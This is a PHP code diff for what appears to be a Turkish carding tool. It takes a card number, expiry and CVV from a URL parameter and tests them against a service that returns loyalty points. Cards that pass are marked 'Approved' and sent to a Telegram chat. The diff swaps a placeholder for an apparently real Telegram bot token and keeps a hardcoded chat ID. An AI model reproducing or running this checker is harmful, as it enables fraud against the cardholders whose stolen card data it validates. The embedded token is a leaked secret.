@@ -1,8 +1,8 @@
 <?php
 error_reporting(0);
 
-$token = "BOT_TOKEN_HERE";  // Buraya Telegram bot tokenini koy
-$chat_id = "-1002770994391"; // LIVE sonuçların düşeceği telegram chat ID
+$token = "8245039266:AAEDCRC_8AkFl0RVtJpGPLS-ECRzcc0GQNY";  // Telegram Bot tokenini buraya yaz
+$chat_id = "-1002770994391"; // Telegram chat id (canlılar için)
 
 if (!isset($_GET['lista'])) {
     http_response_code(400);
@@ -18,7 +18,6 @@ if (count($cc_details) != 4) {
 }
 
 list($c, $m, $y, $cv) = $cc_details;
-
 if (strlen($y) === 4) {
     $y = substr($y, -2);
 }
@@ -52,7 +51,7 @@ if (isset($resJson['message']) && strpos($resJson['message'], 'puanınız') !== 
     $puan = $resJson['message'];
     $output = "✅Approved|{$lista}|{$puan}|@belkidoner";
     
-    // Telegram log gönder
+    // Telegram'a log gönder
     sendTelegramLog($token, $chat_id, $output);
     
     echo $output;
